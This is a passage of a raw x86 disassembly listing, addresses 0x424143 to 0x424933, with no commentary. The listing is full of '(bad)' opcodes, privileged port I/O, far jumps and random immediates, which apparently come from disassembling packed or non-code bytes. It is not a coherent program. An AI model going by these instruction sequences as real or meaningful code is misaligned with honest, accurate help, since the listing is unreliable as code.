  424143:	pop    edx
  424144:	jne    0x424159
  424146:	push   edi
  424147:	pop    eax
  424148:	add    BYTE PTR [esi-0x6b],0x7a
  42414c:	dec    edx
  42414d:	in     eax,dx
  42414e:	sbb    cl,cl
  424150:	(bad)  
  424153:	dec    eax
  424154:	adc    BYTE PTR [ebx-0x176ef510],ah
  42415a:	cmp    esi,DWORD PTR [edx-0x588ca3d4]
  424160:	stos   BYTE PTR es:[edi],al
  424161:	pop    edx
  424162:	push   cs
  424163:	out    0xa2,eax
  424165:	ins    BYTE PTR es:[edi],dx
  424166:	push   cs
  424167:	add    eax,0xb9f954d1
  42416c:	imul   ecx,DWORD PTR [bx],0xffffffd7
  424170:	or     al,0xc9
  424172:	xorps  xmm6,xmm3
  424175:	dec    edx
  424176:	pop    ds
  424177:	(bad)  
  424178:	xchg   ebx,eax
  424179:	mov    al,ds:0x90268c3c
  42417e:	loop   0x4241c5
  424180:	je     0x4241ea
  424182:	call   0x5c31:0x8b905a91
  424189:	mov    ?,WORD PTR [ebx-0x74]
  42418c:	push   ebx
  42418d:	adc    BYTE PTR [ebx-0x9],bh
  424190:	lods   al,BYTE PTR ds:[esi]
  424191:	test   edi,ebp
  424193:	push   edx
  424194:	adc    BYTE PTR [ebp+0x4dcfdab1],bl
  42419a:	repnz nop
  42419c:	data16 mov dl,0xab
  42419f:	or     ch,BYTE PTR [eax+0x3a]
  4241a2:	lock ret 0x3d7e
  4241a6:	ins    BYTE PTR es:[edi],dx
  4241a7:	push   ecx
  4241a8:	test   DWORD PTR [edx],ebx
  4241aa:	mov    esi,fs
  4241ac:	xchg   DWORD PTR [ebx+edi*8],ebp
  4241af:	add    bl,BYTE PTR [edi+0x639833e6]
  4241b5:	pushf  
  4241b6:	lds    esp,FWORD PTR [edx+0x33decea2]
  4241bc:	xor    bh,BYTE PTR [ebx-0x71824196]
  4241c2:	pushf  
  4241c3:	dec    eax
  4241c4:	inc    edi
  4241c5:	add    al,0x31
  4241c7:	les    esi,FWORD PTR [ebx+0x25ea46fc]
  4241cd:	imul   esi,DWORD PTR [ebp+0x5505af86],0x7cdc733e
  4241d7:	or     ch,BYTE PTR [ebp+0x1b3ea284]
  4241dd:	inc    esp
  4241de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241df:	mov    bl,0x17
  4241e1:	loopne 0x42418c
  4241e3:	and    cl,BYTE PTR [edi-0x523f1ed0]
  4241e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241ea:	mov    al,ds:0xd08493d
  4241ef:	xchg   ecx,eax
  4241f0:	xor    al,0xda
  4241f2:	adc    dh,BYTE PTR [edx-0x4]
  4241f5:	sahf   
  4241f6:	dec    ebp
  4241f7:	mov    ch,0x34
  4241f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241fa:	jno    0x4241ad
  4241fc:	xlat   BYTE PTR ds:[ebx]
  4241fd:	lahf   
  4241fe:	and    ebx,DWORD PTR [edx-0x1e]
  424201:	cmp    BYTE PTR [eax],cl
  424203:	add    cl,BYTE PTR [ebp-0x60]
  424206:	fild   WORD PTR [eax+0xd]
  424209:	jo     0x4241b1
  42420b:	pop    edi
  42420c:	and    ebp,DWORD PTR [esi]
  42420e:	in     al,dx
  42420f:	adc    BYTE PTR [edx+0xf],al
  424212:	ins    BYTE PTR es:[edi],dx
  424213:	retf   0xaa02
  424216:	adc    dl,BYTE PTR [ebx+0x6e6a7158]
  42421c:	shl    BYTE PTR [eax*8-0x63cc5a3d],1
  424223:	pop    es
  424224:	stos   DWORD PTR es:[edi],eax
  424225:	scas   eax,DWORD PTR es:[edi]
  424226:	jb     0x424268
  424228:	iret   
  424229:	out    dx,eax
  42422a:	mov    fs,WORD PTR [ebp-0x5d]
  42422d:	popa   
  42422e:	xchg   esp,eax
  42422f:	and    BYTE PTR [ecx-0x7d2237c7],bl
  424235:	dec    ebx
  424236:	mov    DWORD PTR [ebp-0x19],esp
  424239:	mov    DWORD PTR [edx-0x36ba7001],edx
  42423f:	je     0x42429a
  424241:	fcom   QWORD PTR [edx+esi*2-0x35efa1f1]
  424248:	js     0x42423f
  42424a:	add    dh,dl
  42424c:	mov    ebx,0x3d9c2bec
  424251:	xor    BYTE PTR [esi-0x1e],cl
  424254:	(bad)  
  424255:	in     al,0xfd
  424257:	aad    0x47
  424259:	pop    esp
  42425a:	xor    ecx,ebx
  42425c:	loop   0x424289
  42425e:	(bad)  
  42425f:	pop    ds
  424260:	mov    ds:0x75de5d9d,eax
  424265:	xor    DWORD PTR ds:0xf16f14da,0x5df163d5
  42426f:	addr16 aaa 
  424271:	sub    eax,0x20101baf
  424276:	mov    bh,0x83
  424278:	xor    esi,edi
  42427a:	cwde   
  42427b:	mov    dl,0x14
  42427d:	mov    ch,0x54
  42427f:	or     al,bl
  424281:	and    eax,0xd9dd1ea2
  424286:	mov    ch,BYTE PTR [ecx+0x656a43a2]
  42428c:	cmp    eax,0xbdc851df
  424291:	(bad)  
  424292:	xchg   ecx,eax
  424293:	repz push eax
  424295:	scas   eax,DWORD PTR es:[edi]
  424296:	cmp    BYTE PTR [edx-0x5254da1f],bl
  42429c:	mov    WORD PTR [edi],es
  42429e:	lods   al,BYTE PTR ds:[esi]
  42429f:	dec    edx
  4242a0:	pop    ebp
  4242a1:	dec    ecx
  4242a2:	cdq    
  4242a3:	retf   
  4242a4:	or     ebx,ebp
  4242a6:	call   0x4da6:0xa16702b8
  4242ad:	stos   BYTE PTR es:[edi],al
  4242ae:	push   ebx
  4242af:	(bad)
  4242b3:	xchg   ebp,eax
  4242b4:	inc    esi
  4242b5:	ret    0x91
  4242b8:	dec    ebx
  4242b9:	popf   
  4242ba:	(bad)  
  4242bb:	cmp    eax,0x4918cbef
  4242c0:	ja     0x42431b
  4242c2:	adc    BYTE PTR [ebx],0x60
  4242c5:	out    dx,al
  4242c6:	add    edx,DWORD PTR [eax-0x63e27eb0]
  4242cc:	sahf   
  4242cd:	cld    
  4242ce:	mov    ah,0x4a
  4242d0:	pop    edx
  4242d1:	aad    0x38
  4242d3:	and    bl,BYTE PTR ds:[edx-0x58]
  4242d7:	pop    ecx
  4242d8:	sub    eax,0x2c9d6320
  4242dd:	xchg   esp,eax
  4242de:	cmp    ch,BYTE PTR [esi-0x4022c180]
  4242e4:	std    
  4242e5:	sub    ah,BYTE PTR [ecx+eax*1+0x47f2233c]
  4242ec:	mov    eax,DWORD PTR [edx-0x53]
  4242ef:	or     al,0x89
  4242f1:	sar    edi,cl
  4242f3:	pop    ebx
  4242f4:	or     BYTE PTR [eax],dl
  4242f6:	pop    esp
  4242f7:	js     0x424360
  4242f9:	xchg   dl,ah
  4242fb:	sbb    DWORD PTR [ecx+0x4f944ef5],ebx
  424301:	inc    esi
  424302:	sub    BYTE PTR [edx-0x61],cl
  424305:	(bad)
  424308:	jecxz  0x424347
  42430a:	ins    DWORD PTR es:[edi],dx
  42430b:	push   cs
  42430c:	ds cmp al,0xbb
  42430f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424310:	add    BYTE PTR [ebp+0x46974e09],0x34
  424317:	sar    DWORD PTR [edx*4+0x7c971cdd],cl
  42431e:	sub    bh,BYTE PTR [ebp+0x2f]
  424321:	popw   ds
  424323:	ja     0x42436c
  424325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424326:	test   ecx,esp
  424328:	(bad)  
  424329:	jl     0x424365
  42432b:	jmp    0xf2b0:0x71bc0ab7
  424332:	out    0xda,al
  424334:	jmp    0x3c1cb2bd
  424339:	push   ebp
  42433a:	bound  esp,QWORD PTR [edx-0x7d]
  42433d:	mov    edx,0x19df
  424342:	mov    esi,0x74ef74ea
  424347:	(bad)  
  424348:	mov    edi,0x98b349fb
  42434d:	xor    ah,BYTE PTR [ecx-0x1a]
  424350:	xlat   BYTE PTR ds:[ebx]
  424351:	xor    ah,dl
  424353:	mov    dh,0x1
  424355:	add    BYTE PTR [esi],ah
  424357:	add    eax,DWORD PTR [eax]
  424359:	add    BYTE PTR [ebp+ebp*2+0x156744cc],cl
  424360:	push   es
  424361:	leave  
  424362:	arpl   WORD PTR [ebx+eax*2],cx
  424365:	psubusw mm7,QWORD PTR [eax+0x2b]
  424369:	xor    DWORD PTR [esi],0xc26e39fa
  42436f:	out    dx,al
  424370:	js     0x4243dd
  424372:	clc    
  424373:	jmp    DWORD PTR [ebp+0x5d]
  424376:	out    dx,al
  424377:	(bad)  
  424378:	lods   eax,DWORD PTR ds:[esi]
  424379:	jp     0x424303
  42437b:	mov    ah,BYTE PTR ds:0x55c9f1ba
  424381:	push   esp
  424382:	add    ecx,edi
  424384:	dec    ebx
  424385:	fiadd  WORD PTR [ecx]
  424387:	shl    ch,1
  424389:	mov    ds,WORD PTR [edi+0x7b]
  42438c:	lahf   
  42438d:	bswap  ebx
  42438f:	dec    eax
  424390:	repz adc eax,0x5f2698c8
  424396:	rcr    ebp,1
  424398:	(bad)  
  424399:	(bad)  
  42439a:	mov    ah,0x17
  42439c:	push   ds
  42439d:	gs sbb eax,0xf940cfd2
  4243a3:	imul   esp,esi,0xfffffff8
  4243a6:	adc    al,0x95
  4243a8:	rol    BYTE PTR [ecx+0x16936c93],1
  4243ae:	outs   dx,BYTE PTR ds:[esi]
  4243af:	mov    ch,BYTE PTR [eax-0x2431d79c]
  4243b5:	mov    WORD PTR [ecx+0x3970fcad],fs
  4243bb:	xor    al,0x11
  4243bd:	sub    BYTE PTR [esi+0x12c9879f],bl
  4243c3:	test   al,0xed
  4243c5:	aaa    
  4243c6:	sbb    edi,DWORD PTR [edx+0x2e]
  4243c9:	pusha  
  4243ca:	push   edi
  4243cb:	fwait
  4243cc:	sub    edx,esi
  4243ce:	cmp    bl,ah
  4243d0:	rcr    DWORD PTR [esi+0x5e],0xf6
  4243d4:	test   DWORD PTR [eax+0x2ea489d7],ecx
  4243da:	sti    
  4243db:	les    esp,FWORD PTR [ebx+0x39]
  4243de:	retf   
  4243df:	dec    eax
  4243e0:	in     al,0x14
  4243e2:	pop    edx
  4243e3:	pop    ebx
  4243e4:	push   edi
  4243e5:	jo     0x424370
  4243e7:	test   DWORD PTR [eax+0x4f],ebx
  4243ea:	mov    edx,0xac9c19bd
  4243ef:	xor    DWORD PTR [eax+eiz*1-0x23a73bee],0x5ff8c1a7
  4243fa:	dec    edi
  4243fb:	xor    DWORD PTR [esi-0xcf07ba7],0x95eddca8
  424405:	jmp    0xe0bd8aef
  42440a:	or     bh,al
  42440c:	es sub ch,ah
  42440f:	dec    edx
  424410:	pop    es
  424411:	adc    ebp,DWORD PTR [edi+0x47d948ac]
  424417:	adc    BYTE PTR [ebx+ebx*1+0x1d],bh
  42441b:	shl    BYTE PTR [ebx],cl
  42441d:	jmp    0xb834:0x6eca8156
  424424:	data16 sub al,0x5f
  424427:	push   edx
  424428:	scas   al,BYTE PTR es:[edi]
  424429:	bound  ecx,QWORD PTR [eax+0x2d75a49d]
  42442f:	add    eax,0xb67b0a67
  424434:	in     eax,dx
  424435:	mov    ch,0x36
  424437:	call   FWORD PTR [ecx+eax*2-0x5]
  42443b:	or     eax,0x923a421f
  424440:	cdq    
  424441:	or     edx,DWORD PTR [esi+0x40e5db9b]
  424447:	leave  
  424448:	sbb    DWORD PTR [ecx],ebp
  42444a:	pop    eax
  42444b:	fist   DWORD PTR [esi-0xb]
  42444e:	xchg   ecx,eax
  42444f:	or     dh,BYTE PTR [ecx]
  424451:	push   ss
  424452:	xchg   ebx,eax
  424453:	dec    edx
  424454:	jmp    0x32d1:0x304336bf
  42445b:	stos   BYTE PTR es:[edi],al
  42445c:	out    dx,al
  42445d:	rcr    BYTE PTR [ebx+0x26ae7614],cl
  424463:	pushf  
  424464:	push   edx
  424465:	xor    DWORD PTR [ecx+0x3527b390],eax
  42446b:	(bad)  
  42446c:	aaa    
  42446d:	aad    0x27
  42446f:	loope  0x42442d
  424471:	call   0xbbb3ce25
  424476:	jecxz  0x424401
  424478:	push   edx
  424479:	cs mov ah,0x15
  42447c:	jbe    0x4244cd
  42447e:	sub    DWORD PTR ds:0xd05e44cf,edi
  424484:	bnd ret 0x2f6e
  424488:	pop    ss
  424489:	lods   eax,DWORD PTR ds:[esi]
  42448a:	clc    
  42448b:	imul   edx
  42448d:	int    0xa0
  42448f:	pop    es
  424490:	inc    esp
  424491:	dec    BYTE PTR [eax]
  424493:	inc    ebp
  424494:	push   edi
  424495:	jmp    0x4244c2
  424497:	rcr    DWORD PTR [esi-0x7c17969b],0x52
  42449e:	mov    cl,0xa8
  4244a0:	lea    ebp,[ecx-0x79879247]
  4244a6:	aam    0x27
  4244a8:	pop    esi
  4244a9:	push   es
  4244aa:	xor    eax,DWORD PTR [ebx+0x48]
  4244ad:	jnp    0x42450f
  4244af:	imul   ebp,DWORD PTR [ebp+ecx*8-0x746fa02],0x99d9db6f
  4244ba:	cli    
  4244bb:	int3   
  4244bc:	(bad)  
  4244bd:	out    dx,al
  4244be:	inc    ecx
  4244bf:	mov    dl,BYTE PTR [edx+0x37]
  4244c2:	lock pop ds
  4244c4:	cli    
  4244c5:	pushf  
  4244c6:	mov    dl,0x69
  4244c8:	(bad)  
  4244ca:	outs   dx,DWORD PTR ds:[esi]
  4244cb:	pusha  
  4244cc:	je     0x424498
  4244ce:	mov    eax,0x548807d7
  4244d3:	cs dec edi
  4244d5:	sbb    al,0xea
  4244d7:	lods   al,BYTE PTR ds:[esi]
  4244d8:	jno    0x42451e
  4244da:	pop    eax
  4244db:	pop    esp
  4244dc:	push   edx
  4244dd:	aas    
  4244de:	leave  
  4244df:	scas   al,BYTE PTR es:[edi]
  4244e0:	(bad)  
  4244e1:	(bad)
  4244e4:	inc    ebx
  4244e5:	sbb    DWORD PTR [edi+0x5eb72c1],esi
  4244eb:	cmp    DWORD PTR ds:0x9b3a82f,edi
  4244f1:	aaa    
  4244f2:	inc    edx
  4244f3:	lahf   
  4244f4:	jne    0x4244e1
  4244f6:	mov    ah,bh
  4244f8:	ins    BYTE PTR es:[edi],dx
  4244f9:	dec    ebp
  4244fa:	mov    ds:0x5a0e237a,eax
  4244ff:	mov    ebx,0xe3748947
  424504:	push   edi
  424505:	jbe    0x4244c8
  424507:	pushf  
  424508:	scas   al,BYTE PTR es:[edi]
  424509:	jmp    0xb588:0xa84ca51b
  424510:	cmc    
  424511:	test   DWORD PTR [esi],0x6f54f116
  424517:	test   DWORD PTR [edi],ebx
  424519:	in     al,0xf0
  42451b:	scas   eax,DWORD PTR es:[edi]
  42451c:	push   edx
  42451d:	and    al,0xf5
  42451f:	mul    DWORD PTR [eax+0x71]
  424522:	and    eax,0xa1f7d37f
  424527:	and    al,0xf5
  424529:	adc    BYTE PTR [edi-0x58],0x52
  42452d:	les    esi,FWORD PTR [eax]
  42452f:	dec    esi
  424530:	cmp    eax,esi
  424532:	mov    esp,0xd9e0d054
  424537:	loope  0x4244e1
  424539:	add    BYTE PTR [edi+ebp*8],0xa9
  42453d:	add    ebx,DWORD PTR [ebx]
  42453f:	lock dec esp
  424541:	pop    ecx
  424542:	push   0x73
  424544:	or     esp,esp
  424546:	fdivp  st(2),st
  424548:	push   0x56
  42454a:	out    0x8b,eax
  42454c:	jmp    0xa44f:0xb871face
  424553:	cmp    esi,DWORD PTR [eax-0x6505beff]
  424559:	xchg   edi,eax
  42455a:	xor    eax,0x927c71c6
  42455f:	push   ebx
  424560:	in     eax,0x96
  424562:	(bad)  
  424563:	pop    esp
  424564:	enter  0xa50d,0xf
  424568:	xlat   BYTE PTR ds:[ebx]
  424569:	aaa    
  42456a:	cmp    edx,ebp
  42456c:	test   eax,0xd13694fe
  424571:	fistp  DWORD PTR [edx-0x7b927d00]
  424577:	jecxz  0x4245c1
  424579:	mov    ds:0xbcb807bb,al
  42457e:	(bad)  
  42457f:	push   ebp
  424580:	add    eax,0xaea5628
  424585:	jl     0x424535
  424587:	mov    al,ds:0x3a38b381
  42458c:	dec    edx
  42458d:	sbb    eax,0x13ca76c5
  424592:	mov    eax,0x92fbe04c
  424597:	jl     0x42452d
  424599:	icebp  
  42459a:	jle    0x424568
  42459c:	and    BYTE PTR [edx-0x50],al
  42459f:	jmp    0xbac2:0x98ff6c14
  4245a6:	rol    DWORD PTR [edx-0xd95e56a],cl
  4245ac:	mov    eax,0xd08a3991
  4245b1:	dec    ebp
  4245b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245b3:	stc    
  4245b4:	leave  
  4245b5:	sbb    al,0x3c
  4245b7:	test   eax,0x16315878
  4245bc:	mov    dh,0xb6
  4245be:	fldenv [edx]
  4245c0:	or     BYTE PTR [edi+0x22],dl
  4245c3:	push   cs
  4245c4:	push   es
  4245c5:	outs   dx,BYTE PTR ds:[esi]
  4245c6:	add    eax,0xa2299123
  4245cb:	hlt    
  4245cc:	add    bl,dh
  4245ce:	mov    WORD PTR [eax+0xbaaa896],cs
  4245d4:	ds fs pop ss
  4245d7:	sahf   
  4245d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d9:	(bad)  
  4245da:	stos   BYTE PTR es:[edi],al
  4245db:	pop    ebx
  4245dc:	cmp    bh,BYTE PTR [edx-0x4edd297c]
  4245e2:	lea    eax,[edx+ecx*2-0x252f103c]
  4245e9:	jecxz  0x424584
  4245eb:	test   DWORD PTR [eax-0x75e54234],0x339530a1
  4245f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245f6:	dec    ebx
  4245f7:	cdq    
  4245f8:	int3   
  4245f9:	jge    0x42465f
  4245fb:	imul   eax,ebp,0xe1753fbb
  424601:	add    DWORD PTR [edx-0x1e],esi
  424604:	mov    cl,BYTE PTR [ebp+0x6]
  424607:	and    eax,0x9219314f
  42460c:	xchg   esp,eax
  42460d:	and    eax,0xcccfcdb4
  424612:	sub    eax,0xd1111a0e
  424617:	mov    esp,0xdc5cf11a
  42461c:	int3   
  42461d:	sub    BYTE PTR [edi+0x144b336a],ah
  424623:	mov    eax,ds:0x2fcc90d7
  424628:	jno    0x424665
  42462a:	nop
  42462b:	and    bh,BYTE PTR gs:[ecx]
  42462e:	fadd   DWORD PTR [edi-0x76]
  424631:	dec    edi
  424632:	dec    eax
  424633:	dec    ecx
  424634:	push   ebp
  424635:	loop   0x424631
  424637:	dec    ebp
  424638:	push   ebx
  424639:	jbe    0x424672
  42463b:	sbb    bh,BYTE PTR [edx]
  42463d:	outs   dx,BYTE PTR ds:[esi]
  42463e:	sbb    ebp,DWORD PTR [ebx-0x55]
  424641:	add    al,0xc3
  424643:	mov    ch,0xbe
  424645:	jns    0x424626
  424647:	inc    esp
  424648:	and    DWORD PTR [edx+0x5f],edx
  42464b:	mov    ch,0xad
  42464d:	push   ebx
  42464e:	(bad)  
  42464f:	xchg   ebx,eax
  424650:	mov    al,ds:0xc749a365
  424655:	das    
  424656:	inc    ebx
  424657:	jmp    0xfc41:0x6be26fd5
  42465e:	pop    ss
  42465f:	lods   eax,DWORD PTR ds:[esi]
  424660:	fldenv [ecx+0x34a4eac6]
  424666:	and    esp,eax
  424668:	push   ebx
  424669:	mov    ds:0xacabc676,eax
  42466e:	clc    
  42466f:	mov    ?,WORD PTR [ecx+0x6eb06711]
  424675:	test   ebp,0x3270c8a
  42467b:	ret    
  42467c:	jne    0x424694
  42467e:	lahf   
  42467f:	add    BYTE PTR [bx+si],al
  424682:	dec    ebx
  424683:	inc    ebp
  424684:	mov    edx,0x5fffbeee
  424689:	in     eax,0x54
  42468b:	stos   BYTE PTR es:[edi],al
  42468c:	clc    
  42468d:	adc    DWORD PTR [ecx],ebx
  42468f:	adc    al,0x34
  424691:	outs   dx,BYTE PTR ds:[esi]
  424692:	or     BYTE PTR [edx+0x3260001],bh
  424698:	add    BYTE PTR [eax],al
  42469a:	popf   
  42469b:	jecxz  0x4246fa
  42469d:	sub    BYTE PTR [ecx-0xea68da4],al
  4246a3:	dec    eax
  4246a4:	cmp    ebx,eax
  4246a6:	mov    edi,0x7246c2cd
  4246ab:	dec    eax
  4246ac:	sbb    BYTE PTR [esi],dh
  4246ae:	dec    eax
  4246af:	dec    ebx
  4246b0:	les    ebp,FWORD PTR [edx-0x45a61658]
  4246b6:	rol    BYTE PTR [esi],1
  4246b8:	jns    0x424654
  4246ba:	icebp  
  4246bb:	sbb    BYTE PTR [ebx-0x1],dh
  4246be:	jne    0x4246e2
  4246c0:	test   BYTE PTR [ebp-0x187d3948],ch
  4246c6:	inc    ebx
  4246c8:	(bad)  
  4246c9:	aam    0x4
  4246cb:	pop    ecx
  4246cc:	jmp    0x42467f
  4246ce:	inc    edx
  4246cf:	jno    0x4246dc
  4246d1:	xor    ebp,DWORD PTR [edi-0x1b6cdbd0]
  4246d7:	stc    
  4246d8:	mov    edx,0x2d315544
  4246dd:	jae    0x4246f2
  4246df:	jnp    0x424705
  4246e1:	pop    ebx
  4246e2:	lods   eax,DWORD PTR ds:[esi]
  4246e3:	shl    DWORD PTR [eax+0x6f],cl
  4246e6:	sub    dl,ah
  4246e8:	lods   al,BYTE PTR ds:[esi]
  4246e9:	jl     0x42473f
  4246eb:	enter  0x1d5d,0xda
  4246ef:	push   es
  4246f0:	lods   al,BYTE PTR ds:[esi]
  4246f1:	das    
  4246f2:	xor    DWORD PTR [ebx+0x4ee9311f],edi
  4246f8:	test   BYTE PTR [esi+0x55eb68fc],dl
  4246fe:	jmp    0x306db53b
  424703:	pop    eax
  424704:	out    0x20,al
  424706:	imul   ebp,eax,0x4c79cf3e
  42470c:	xchg   BYTE PTR [eax+0x37],bl
  42470f:	add    eax,0x1e2779ff
  424714:	les    esi,FWORD PTR [eax+0x9]
  424717:	loop   0x42478a
  424719:	cmp    edx,edi
  42471b:	and    eax,0xce913667
  424720:	ror    BYTE PTR [ebx-0x5bfb5afb],1
  424726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424727:	popa   
  424728:	(bad)  
  424729:	pop    ss
  42472a:	arpl   sp,si
  42472c:	icebp  
  42472d:	cmovl  esi,DWORD PTR [eax+0x47ff4602]
  424734:	jg     0x424727
  424736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424737:	ret    
  424738:	ror    dl,1
  42473a:	sub    DWORD PTR [ebp+edi*1+0x3c],edi
  42473e:	enter  0x79a5,0xe9
  424742:	xchg   esp,eax
  424743:	pop    ebx
  424744:	xchg   bl,bh
  424746:	and    bl,BYTE PTR [esi-0x5a]
  424749:	stos   BYTE PTR es:[edi],al
  42474a:	popa   
  42474b:	enter  0xde92,0xd0
  42474f:	pop    ds
  424750:	rcl    DWORD PTR [ecx],0x75
  424753:	les    esp,FWORD PTR [edx]
  424755:	ss fs mov edx,0x8344a1b3
  42475c:	daa    
  42475d:	scas   al,BYTE PTR es:[edi]
  42475e:	fdivr  QWORD PTR ds:0xa5daa3a0
  424764:	ret    
  424765:	and    DWORD PTR [eax+0x25],ecx
  424768:	mov    esi,0xb8143cf7
  42476d:	iret   
  42476e:	mul    BYTE PTR [ebp-0x66]
  424771:	aam    0x49
  424773:	sbb    al,0x8d
  424776:	or     al,0xac
  424778:	xchg   edx,eax
  424779:	mov    ecx,0x2a192ef4
  42477e:	shr    BYTE PTR [esi-0x1d],cl
  424781:	mov    dl,0xc7
  424783:	jbe    0x42472c
  424785:	lock (bad) 
  424787:	data16 fcomp DWORD PTR [ebp-0x12e964e0]
  42478e:	add    ch,BYTE PTR [eax-0x10]
  424791:	fldcw  WORD PTR [esi-0x68d6bd3]
  424797:	jg     0x4247b9
  424799:	fidiv  DWORD PTR fs:[esi+0x49]
  42479d:	push   esi
  42479e:	ss sahf 
  4247a0:	mov    eax,ds:0x5fed9e65
  4247a5:	rol    esi,0x4a
  4247a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247a9:	aad    0x1c
  4247ab:	or     eax,0x24cb356f
  4247b0:	sub    al,0x65
  4247b2:	fs mov al,0xc8
  4247b5:	xchg   edx,eax
  4247b6:	push   0x2f7959e1
  4247bb:	shl    DWORD PTR ds:[edi+0x3],0x8c
  4247c0:	cmp    edi,edi
  4247c2:	int3   
  4247c3:	mov    ah,0x90
  4247c5:	je     0x424838
  4247c7:	pop    edx
  4247c9:	je     0x42477b
  4247cb:	jg     0x424786
  4247cd:	popf   
  4247ce:	shl    edi,1
  4247d0:	sbb    BYTE PTR [ecx-0x3e],dl
  4247d3:	mov    bh,0x68
  4247d5:	mov    eax,ds:0x4a400a84
  4247da:	stos   DWORD PTR es:[edi],eax
  4247db:	je     0x4247a7
  4247dd:	mov    ebp,0x4217e520
  4247e2:	and    edx,DWORD PTR [esi+esi*1-0x2b0da559]
  4247e9:	pop    ecx
  4247ea:	cmp    DWORD PTR [edi+0x7d41c385],ecx
  4247f0:	ror    BYTE PTR [ebp+0x104ff10f],0x31
  4247f7:	lea    esi,[ecx]
  4247f9:	stos   DWORD PTR es:[edi],eax
  4247fa:	inc    ecx
  4247fb:	dec    ecx
  4247fc:	pop    es
  4247fd:	retf   0x79c3
  424800:	adc    ebx,ebp
  424802:	mov    ds:0xcdc9aae0,eax
  424807:	data16 and cl,BYTE PTR [ecx+0x1e610223]
  42480e:	ins    DWORD PTR es:[edi],dx
  42480f:	mov    al,ds:0xde0cf1ef
  424814:	nop
  424815:	sbb    esp,ebx
  424817:	mov    ch,0xf7
  424819:	jecxz  0x4247bf
  42481b:	jmp    0x6b17:0xaea8ecb2
  424822:	sar    BYTE PTR [eax-0x62],cl
  424825:	dec    ecx
  424826:	pop    ecx
  424827:	stos   DWORD PTR es:[edi],eax
  424828:	sub    BYTE PTR [edi+0x3e],0xdf
  42482c:	sbb    esi,ecx
  42482e:	test   al,0xe5
  424830:	jne    0x4248b1
  424832:	mov    bl,0xb
  424834:	sub    al,0x38
  424836:	mov    dh,0xe0
  424838:	shl    DWORD PTR [edx+0x44],1
  42483b:	ds mov bl,0x97
  42483e:	(bad)  
  42483f:	mov    ecx,0x5ff2bacc
  424844:	ficomp DWORD PTR [eax+eiz*1]
  424847:	les    ecx,FWORD PTR [ecx+0x70]
  42484a:	dec    eax
  42484b:	mov    eax,ds:0x26472fca
  424850:	xlat   BYTE PTR ds:[ebx]
  424851:	cmp    DWORD PTR [ecx],edi
  424853:	or     BYTE PTR [edx],dl
  424855:	push   edx
  424856:	leave  
  424857:	adc    ch,BYTE PTR [ecx+0x360eb6c3]
  42485d:	push   edi
  42485e:	jp     0x42485c
  424860:	nop
  424861:	pop    ebx
  424862:	push   0x95a2eac4
  424867:	push   cs
  424868:	cmc    
  424869:	jge    0x424876
  42486b:	add    DWORD PTR [edi],esp
  42486d:	xor    al,0xb0
  42486f:	xlat   BYTE PTR ds:[ebx]
  424870:	dec    edi
  424871:	in     al,dx
  424872:	inc    DWORD PTR [edi+0x2c09d6e3]
  424878:	add    ecx,DWORD PTR [ebx]
  42487a:	call   0xcbc65da9
  42487f:	add    eax,0xb5c66e47
  424884:	sbb    eax,0xf5205c9b
  424889:	adc    eax,0x9caf60ad
  42488e:	cmp    DWORD PTR [eax],ebp
  424890:	and    BYTE PTR [ebp+eiz*1-0x51],bl
  424894:	xchg   ebx,eax
  424895:	push   ss
  424896:	cmp    eax,0x3b1bd421
  42489b:	cmp    eax,DWORD PTR [edi-0x26]
  42489e:	call   0x7773:0x5be1982c
  4248a5:	pop    es
  4248a6:	ret    0x8589
  4248a9:	xor    bl,BYTE PTR [esi+0x48]
  4248ac:	ror    BYTE PTR [ebp+0x60],1
  4248af:	dec    eax
  4248b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248b1:	ret    
  4248b2:	xchg   ebp,eax
  4248b3:	pusha  
  4248b4:	xchg   edi,eax
  4248b5:	and    ebx,edi
  4248b7:	pop    esi
  4248b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248b9:	add    esp,DWORD PTR [ecx]
  4248bb:	fiadd  WORD PTR [edx-0x55bf30b5]
  4248c1:	inc    edx
  4248c2:	inc    esp
  4248c3:	ja     0x4248dc
  4248c5:	test   al,0xc
  4248c7:	int    0x88
  4248c9:	imul   ebp,DWORD PTR [edx-0x9daacf4],0x60ed3347
  4248d3:	jns    0x424916
  4248d5:	xor    BYTE PTR [edi+0x3057e6a1],dl
  4248db:	xor    dl,BYTE PTR [ecx-0x6cf45d90]
  4248e1:	mov    ebx,0x5b4668bd
  4248e6:	push   es
  4248e7:	outs   dx,BYTE PTR ds:[esi]
  4248e8:	xchg   ebp,eax
  4248e9:	pop    esi
  4248ea:	ins    DWORD PTR es:[edi],dx
  4248eb:	or     esp,ebx
  4248ed:	sbb    dh,BYTE PTR [ecx]
  4248ef:	retf   0xc49f
  4248f2:	hlt    
  4248f3:	or     DWORD PTR [edx+eax*1-0x5e66358e],ebp
  4248fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248fb:	scas   al,BYTE PTR es:[edi]
  4248fc:	lods   al,BYTE PTR ds:[esi]
  4248fd:	pop    ebp
  4248fe:	mov    dl,0x80
  424900:	xchg   ebx,eax
  424901:	icebp  
  424902:	dec    ebx
  424903:	gs and al,0xd3
  424906:	cld    
  424907:	std    
  424908:	lock jmp 0x42496a
  42490b:	scas   eax,DWORD PTR es:[edi]
  42490c:	mov    ah,0x5e
  42490e:	sbb    BYTE PTR ds:0x38a0a6c2,al
  424914:	xchg   ebp,eax
  424915:	xchg   edi,eax
  424916:	mov    edx,0x19397c76
  42491b:	lock (bad) 
  42491d:	sbb    DWORD PTR [edx+eax*8],ebp
  424920:	adc    DWORD PTR ss:[esi+0x39],0xffffffc8
  424925:	fcmovb st,st(4)
  424927:	mov    eax,ds:0xc2122605
  42492c:	mov    ecx,0x828c0803
  424931:	mov    dh,0x1e
  424933:	dec    ecx
